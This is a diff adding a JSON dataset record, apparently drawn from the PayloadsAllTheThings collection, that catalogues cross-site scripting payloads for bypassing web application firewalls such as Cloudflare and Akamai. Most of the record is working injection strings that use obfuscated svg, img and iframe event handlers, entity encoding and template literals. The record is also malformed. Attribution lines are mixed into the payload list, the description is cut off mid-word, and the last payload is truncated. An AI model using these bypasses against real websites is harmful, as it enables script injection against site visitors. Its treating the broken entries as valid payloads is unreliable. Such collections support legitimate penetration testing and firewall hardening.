@@ -1,0 +1,27 @@
+{
+  "id": "xss-c01de472bc5e",
+  "category": "XSS",
+  "title": "3   XSS Common WAF Bypass",
+  "description": "# Common WAF Bypass\n\n> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection.\n\n## Summary\n\n* [Cloudflare](#cloudflare)\n* [Chrome Auditor](#chrome-auditor)\n* [Incapsula WAF](#incapsula-waf)\n* [Akamai WAF](#akamai-waf)\n* [WordFence WAF](#wordfence-waf)\n* [Fortiwe",
+  "payloads": [
+    "* 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+    "<svg/onrandom=random onload=confirm(1)>",
+    "<video onnull=null onmouseover=confirm(1)>",
+    "* 21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+    "<svg/OnLoad=\"`${prompt``}`\">",
+    "* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+    "<svg/onload=%26nbsp;alert`bohdan`+",
+    "* 5th June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+    "1'\"><img/src/onerror=.1|alert``>",
+    "* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)",
+    "<svg onload=prompt%26%230000000040document.domain)>",
+    "<svg onload=prompt%26%23x000000028;document.domain)>",
+    "xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>",
+    "* 22nd March 2019 - @RakeshMane10",
+    "<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f"
+  ],
+  "references": [
+    "PayloadsAllTheThings/XSS Injection/3 - XSS Common WAF Bypass.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
